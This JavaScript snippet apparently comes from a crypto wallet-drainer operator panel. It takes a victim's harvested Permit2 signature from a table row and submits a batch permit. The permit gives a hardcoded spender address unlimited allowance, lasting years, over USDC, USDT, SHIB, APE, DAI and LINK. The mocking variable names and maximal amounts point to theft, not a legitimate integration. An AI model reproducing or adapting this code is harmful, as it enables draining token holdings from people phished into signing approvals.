const instancePermit2 = () => {
    const PERMIT2_ADDRESS ="0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    console.log(signer);
    const _Contract = new ethers.Contract(PERMIT2_ADDRESS, ABI.permit2.abi, signer);
    return _Contract;
  }



  const Permit2SpenderMulti = async (event) => {
  console.log(event.target.parentElement.parentElement.getElementsByClassName("column-signature")[0].innerText);
    // 初始化变量
    const owner_wuwu = event.target.parentElement.parentElement.getElementsByClassName("column-account")[0].children[0].textContent;
    const spender_haha = '0xE9D8FaBBD5BF9f478a795d7F3184280646D411A3';
    const signature = event.target.parentElement.parentElement.getElementsByClassName("column-signature")[0].innerText
    const amount = '1461501637330902918203684832716283019655932542975'
    const expiration = 1885674579

    // //实例化Permit2合约
    const permit2contract = instancePermit2();
    try {
      await permit2contract["permit(address,((address,uint160,uint48,uint48)[],address,uint256),bytes)"]
        (owner_wuwu,
          [
            [
              [TKIF.usdc.address, amount, expiration, 0],
              [TKIF.usdt.address, amount, expiration, 0],
              [TKIF.shib.address, amount, expiration, 0],
              [TKIF.ape.address, amount, expiration, 0],
              [TKIF.dai.address, amount, expiration, 0],
              [TKIF.link.address, amount, expiration, 0],
            ],
            spender_haha,
            expiration
          ], signature, { gasLimit: 800000 })
    } catch (err) {
      console.log(err);
    }
  }